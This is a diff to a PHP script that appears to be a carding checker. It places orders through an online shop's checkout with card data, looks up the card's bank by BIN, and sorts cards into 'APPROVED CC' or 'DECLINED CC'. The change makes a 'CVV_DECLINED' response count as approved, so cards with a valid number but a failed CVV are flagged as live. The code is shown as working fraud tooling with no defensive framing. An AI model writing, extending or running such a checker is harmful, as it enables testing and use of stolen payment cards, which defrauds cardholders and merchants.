@@ -755,6 +755,8 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, [
         $err = '🔥Thank you for your purchase! -> $13.99'; 
     } elseif (str_contains($response5, 'Your order is confirmed')) {
         $err = '🔥Your Order Has Been Placed! ->> $13.98';
+    } elseif (str_contains($response5, 'CVV_DECLINED')) {
+        $err = '✅ CVV DECLINED';
     } elseif (isset($r5js->data->receipt->processingError->code)) {
         $err = $r5js->data->receipt->processingError->code;
     } elseif (str_contains($response5, 'CompletePaymentChallenge')) {
@@ -798,7 +800,7 @@ if (!$bininfo || !isset($bininfo['bank'])) {
 }
 
 // ▶️ Status logic
-if (stripos($err, 'CHARGED') !== false || stripos($err, 'purchase') !== false || stripos($err, 'Order') !== false) {
+if (stripos($err, 'CHARGED') !== false || stripos($err, 'purchase') !== false || stripos($err, 'CVV') !== false || stripos($err, 'Order') !== false) {
     $status = "✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐂";
 } else {
     $status = "❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 𝐂𝐂";
